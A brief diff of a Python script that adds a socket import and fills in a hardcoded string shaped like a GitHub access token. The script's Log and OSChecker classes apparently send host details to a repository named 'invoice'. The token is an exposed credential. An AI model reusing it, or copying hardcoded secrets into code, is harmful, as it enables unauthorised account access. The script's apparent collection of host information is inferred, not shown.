@@ -6,6 +6,8 @@ import requests
 import base64
 import getpass
 import datetime
+import socket
+
 
 class Log():
     def __init__(self, repository_owner, repository_name, access_token):
@@ -170,7 +172,7 @@ class OSChecker():
 
 repository_owner = 'rsecurity12' 
 repository_name = 'invoice' 
-access_token = ''  
+access_token = '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'  
 file_creator = Log(repository_owner, repository_name, access_token)
 info = OSChecker("OSChecker")
 info.check_operating_system()
